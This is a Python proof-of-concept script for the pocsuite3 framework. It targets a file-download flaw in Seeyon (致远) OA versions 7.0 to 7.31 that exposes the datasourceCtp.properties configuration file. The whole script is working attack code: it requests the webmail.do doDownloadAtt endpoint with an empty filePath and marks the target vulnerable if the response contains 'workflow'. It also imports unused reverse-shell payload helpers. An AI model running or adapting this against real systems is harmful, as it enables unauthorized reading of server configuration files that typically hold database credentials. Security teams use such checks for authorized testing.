from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = '003'  # ssvid
    version = '1.0'
    name = '致远OA datasourceCtp.properties 配置文件下载'
    appName = '致远'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''致远OAdatasourceCtp.properties配置文件下载'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath="
            r = requests.get(url=target,timeout=8,verify=False)
            if "workflow" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)